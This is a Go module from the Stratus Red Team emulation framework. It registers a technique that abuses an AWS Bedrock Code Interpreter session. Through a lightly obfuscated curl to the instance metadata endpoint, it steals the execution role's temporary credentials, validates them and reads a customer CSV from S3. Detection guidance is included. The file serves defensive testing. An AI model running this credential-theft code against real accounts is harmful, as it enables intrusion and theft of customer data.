package aws

import (
	"context"
	_ "embed"
	"encoding/json"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/aws-sdk-go-v2/service/sts"
	"github.com/aws/aws-sdk-go-v2/service/bedrockagentcore"
	"github.com/aws/aws-sdk-go-v2/service/bedrockagentcore/types"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.exfiltration.s3-bedrock",
		FriendlyName:       "Exfiltrate S3 Data via Bedrock Code Interpreter",
		Platform:           stratus.AWS,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		Description: `
Exfiltrates data from an S3 bucket by leveraging AWS Bedrock Code Interpreter to access EC2 instance metadata 
and retrieve temporary credentials from the execution role.

Warm-up: 

- Create an S3 bucket with a sample customer data file (customer.csv).
- Create an IAM role with S3 read permissions for Bedrock Agent Core service.
- Create a Bedrock Code Interpreter with the execution role.

Detonation: 

- Start a Bedrock Code Interpreter session.
- Execute a command to query the EC2 instance metadata service (IMDS) endpoint at 169.254.169.254.
- Retrieve temporary security credentials from the execution role.
- These credentials can be used to access the S3 bucket and exfiltrate data.

The attack demonstrates how Bedrock Code Interpreter's access to instance metadata can be abused to 
obtain credentials and access AWS resources beyond intended scope.
`,
		Detection: `
- Through VPC Flow Logs, detect traffic to the IMDS endpoint (169.254.169.254) from Bedrock resources.
- Alert on S3 access patterns that don't match expected application behavior, particularly GetObject 
operations following Bedrock Code Interpreter invocations.
- Use AWS GuardDuty to detect [Exfiltration:S3/AnomalousBehavior](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html) 
findings that may indicate data exfiltration.
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bedrockClient := bedrockagentcore.NewFromConfig(providers.AWS().GetConnection())
	codeInterpreterID := params["code_interpreter"]
	bucketName := params["bucket_name"]

	log.Println("Starting Bedrock Code Interpreter session")
	log.Printf("Code Interpreter ID: %s\n", codeInterpreterID)
	
	sessionResp, err := bedrockClient.StartCodeInterpreterSession(context.Background(), 
		&bedrockagentcore.StartCodeInterpreterSessionInput{
			CodeInterpreterIdentifier: aws.String(codeInterpreterID),
		})
	if err != nil {
		return errors.New("failed to start code interpreter session: " + err.Error())
	}

	sessionID := sessionResp.SessionId
	metadataCommand := `IP="169.254.169.254"; METADATA="meta-data"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role`

	log.Printf("Running command through Code Interpreter with session %s: %s\n", *sessionID, metadataCommand)

	invokeResp, err := bedrockClient.InvokeCodeInterpreter(context.Background(),
		&bedrockagentcore.InvokeCodeInterpreterInput{
			CodeInterpreterIdentifier: aws.String(codeInterpreterID),
			SessionId:                 sessionID, // sessionResp.SessionId is already *string
			Name:                      types.ToolNameExecuteCommand, // prefer constant
			Arguments: &types.ToolArguments{
				Command: aws.String(metadataCommand),
			},
		})
	if err != nil {
		return errors.New("failed to invoke code interpreter: " + err.Error())
	}

	stream := invokeResp.GetStream()
	if stream == nil {
		log.Println("No stream returned")
		return nil
	}

	var events []types.CodeInterpreterStreamOutput
	for ev := range stream.Events() {
		events = append(events, ev)
	}

	if err := stream.Err(); err != nil {
		return errors.New("stream error: " + err.Error())
	}
	if err := stream.Close(); err != nil {
		return errors.New("failed to close stream: " + err.Error())
	}

	if len(events) == 0 {
		return errors.New("no events returned from code interpreter")
	}

	last := events[len(events)-1]

	var wrapper struct {
		Value struct {
			Content []struct{ Text string } `json:"Content"`
		} `json:"Value"`
	}
	b, _ := json.Marshal(last)
	if err := json.Unmarshal(b, &wrapper); err != nil {
		return errors.New("failed to unmarshal last event: " + err.Error())
	}
	if len(wrapper.Value.Content) == 0 {
		return errors.New("no content in last event")
	}

	var metadataResponse struct {
		Code            string `json:"Code"`
		AccessKeyId     string `json:"AccessKeyId"`
		SecretAccessKey string `json:"SecretAccessKey"`
		Token           string `json:"Token"`
	}
	if err := json.Unmarshal([]byte(wrapper.Value.Content[0].Text), &metadataResponse); err != nil {
		return errors.New("failed to parse metadata JSON: " + err.Error())
	}

	if metadataResponse.Code != "Success" {
		log.Printf("Command execution returned code: %s\n", metadataResponse.Code)
	} else {
		log.Println("Command executed successfully via Bedrock AgentCore")
	}

	newAwsConnection := utils.AwsConfigFromCredentials(
		metadataResponse.AccessKeyId,
		metadataResponse.SecretAccessKey,
		metadataResponse.Token,
		&providers.AWS().UniqueCorrelationId,
	)

	newStsClient := sts.NewFromConfig(newAwsConnection)
	idResp, err := newStsClient.GetCallerIdentity(context.Background(), &sts.GetCallerIdentityInput{})
	if err != nil || idResp.Arn == nil {
		return errors.New("failed to validate temporary credentials")
	}

	log.Println("Successfully stole temporary instance credentials from the instance metadata service")
	log.Println("sts:GetCallerIdentity returned "+ *idResp.Arn)

	s3Client := s3.NewFromConfig(newAwsConnection)
	log.Println("Locally running a benign API call s3:GetObject using stolen credentials")
	_, err = s3Client.GetObject(context.Background(), &s3.GetObjectInput{
		Bucket: aws.String(bucketName),
		Key:    aws.String("customer.csv"),
	})
	if err != nil {
		return errors.New("failed to fetch S3 object customer.csv: " + err.Error())
	}
	log.Println("Successfully fetched customer.csv from bucket:", bucketName)

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	// For this attack, there's no persistent change to revert
	// The session is terminated automatically
	log.Println("No persistent changes to revert - Bedrock sessions are ephemeral")
	return nil
}